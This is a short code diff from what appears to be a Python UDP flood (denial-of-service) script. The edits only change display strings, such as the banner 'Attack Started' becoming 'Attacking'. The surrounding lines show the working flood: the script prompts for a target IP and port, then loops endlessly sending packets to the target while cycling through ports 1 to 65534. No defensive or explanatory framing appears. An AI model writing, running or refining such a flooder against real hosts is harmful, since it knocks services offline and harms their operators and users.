@@ -29,7 +29,7 @@ rt = raw_input("Enter Your Target IP : ")
 hack = input("Enter Any Port       : ")
 
 os.system("clear")
-os.system("figlet Attack Started  |  lolcat")
+os.system("figlet Attacking  |  lolcat")
 print (grn + "[#...................] wait 0% loading" + grn)
 time.sleep(1)
 print (grn + "[####................] wait 20% loading" + grn)
@@ -47,7 +47,7 @@ while True:
      reg.sendto(load,(rt,hack))
      send = send + 1
      hack = hack + 1
-     print ("send %s the packet  %s through port:%s"%(send,rt,hack))
+     print ("sends %s the packet  %s through port:%s"%(send,rt,hack))
      if hack == 65534:
        hack = 1
 
